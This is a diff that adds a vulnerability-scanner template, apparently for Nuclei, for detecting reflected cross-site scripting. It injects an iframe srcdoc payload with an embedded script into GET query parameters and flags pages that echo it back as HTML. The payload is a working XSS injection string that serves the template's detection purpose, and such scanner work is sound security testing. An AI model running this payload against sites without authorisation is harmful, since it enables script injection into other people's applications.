@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-iframe
+
+info:
+  name: XSS iframe Test Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect XSS vulnerabilities using a specified iframe payload with embedded script.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "xss\\'\\'\\'\\'><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
